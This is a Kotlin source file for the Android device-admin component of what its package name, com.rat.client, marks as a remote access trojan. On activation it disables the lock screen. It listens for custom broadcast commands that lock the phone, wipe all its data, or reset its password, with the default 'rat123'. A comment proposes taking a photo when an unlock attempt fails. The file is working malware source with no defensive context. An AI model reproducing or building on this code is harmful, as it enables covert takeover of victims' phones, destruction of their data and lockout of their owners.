package com.rat.client.receiver

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.rat.client.util.DeviceUtils
import com.rat.client.util.PreferencesManager
import com.rat.client.util.SystemUtils

class DeviceAdminReceiverImpl : DeviceAdminReceiver() {

    companion object {
        @Suppress("UNUSED_PARAMETER")
        private const val TAG = "DeviceAdminReceiver"
    }

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        Log.d(TAG, "Device admin enabled")
        PreferencesManager.putBoolean("device_admin_enabled", true, true)
        // Disable keyguard for unlock capability
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val adminComponent = android.content.ComponentName(context, this.javaClass)
        dpm.setKeyguardDisabled(adminComponent, true)
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        Log.d(TAG, "Device admin disabled")
        PreferencesManager.putBoolean("device_admin_enabled", false, true)
    }

    override fun onLockTaskModeEntering(context: Context, intent: Intent, pkg: String) {
        super.onLockTaskModeEntering(context, intent, pkg)
        Log.d(TAG, "Lock task mode entering: $pkg")
    }

    override fun onLockTaskModeExiting(context: Context, intent: Intent) {
        super.onLockTaskModeExiting(context, intent)
        Log.d(TAG, "Lock task mode exiting")
    }

    override fun onPasswordChanged(context: Context, intent: Intent, userHandle: android.os.UserHandle) {
        super.onPasswordChanged(context, intent, userHandle)
        Log.d(TAG, "Password changed")
    }

    override fun onPasswordFailed(context: Context, intent: Intent) {
        super.onPasswordFailed(context, intent)
        Log.d(TAG, "Password failed attempt")
        // Could trigger photo capture here
    }

    override fun onPasswordSucceeded(context: Context, intent: Intent) {
        super.onPasswordSucceeded(context, intent)
        Log.d(TAG, "Password succeeded")
    }

    override fun onReceive(context: Context, intent: Intent) {
        super.onReceive(context, intent)
        // Handle custom admin actions
        if (intent.action == "com.rat.client.LOCK_NOW") {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = android.content.ComponentName(context, this.javaClass)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.lockNow()
            }
        } else if (intent.action == "com.rat.client.WIPE_DATA") {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = android.content.ComponentName(context, this.javaClass)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.wipeData(adminComponent, 0)
            }
        } else if (intent.action == "com.rat.client.RESET_PASSWORD") {
            val newPassword = intent.getStringExtra("password") ?: "rat123"
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val adminComponent = android.content.ComponentName(context, this.javaClass)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.resetPassword(newPassword, 0)
            }
        }
    }
}